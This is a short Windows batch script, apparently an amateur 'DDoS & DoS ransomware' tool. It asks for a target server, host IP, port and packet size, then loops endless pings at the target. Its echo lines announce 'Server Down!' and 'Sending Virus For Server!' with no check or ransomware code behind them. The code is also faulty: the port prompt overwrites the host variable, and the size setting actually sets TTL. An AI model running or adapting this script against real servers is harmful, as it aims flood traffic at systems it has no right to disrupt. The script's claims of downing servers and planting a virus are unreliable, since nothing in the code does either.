@echo off  
mode 67,16  
title DDOS Attack  
color 0a  
cls  
echo.  
echo �����������������������������������������������������������������  
echo DDoS & DoS RANSOMWARE Virus C0d3D:Tn.Cr0DiXZeroTeeN7_
echo �����������������������������������������������������������������  
echo.  
set /p x=Server-Target:  
echo.  
echo �����������������������������������������������������������������  
ping %x%  
echo �����������������������������������������������������������������  
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul  
goto Next  
:Next  
echo.  
echo.  
echo.  
set /p m=ip Host:  
echo.  
set /p m=port Host:
echo.
set /p n=Packet Size:  
echo.  
:DDOS  
color 0c  
echo Attacking Server! %m%
echo.
echo.
echo.
echo.
echo Server Down! %m%  
ping %m% -i %n% -t >nul  
echo.
echo.
echo.
echo ransomware.c
echo Sending Virus For Server! %m%
echo.
echo.
echo.
echo.
goto DDOS 